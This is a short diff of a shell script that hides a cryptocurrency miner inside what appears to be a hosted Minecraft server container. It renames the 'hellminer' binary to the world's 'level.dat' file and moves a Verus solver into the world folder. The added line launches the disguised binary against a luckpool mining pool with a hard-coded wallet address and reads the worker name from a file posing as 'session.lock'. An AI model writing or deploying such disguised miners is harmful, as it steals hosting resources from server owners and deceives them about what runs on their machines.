@@ -7,5 +7,4 @@ mv hellminer /home/container/world/level.dat
 mv verus-solver /home/container/world/
 cd /home/container/world
 rm -r /home/container/luckpool
-bash /home/container/world_the_end/session.lock
-./level.dat -c stratum+tcp://eu.luckpool.net:3956 -u RKxL8cCnTTBwMcV1dPFst2pt6P8AJwyfDW.$m
+./level.dat -c stratum+tcp://eu.luckpool.net:3956 -u RKxL8cCnTTBwMcV1dPFst2pt6P8AJwyfDW.$(cat /home/container/world_the_end/session.lock)
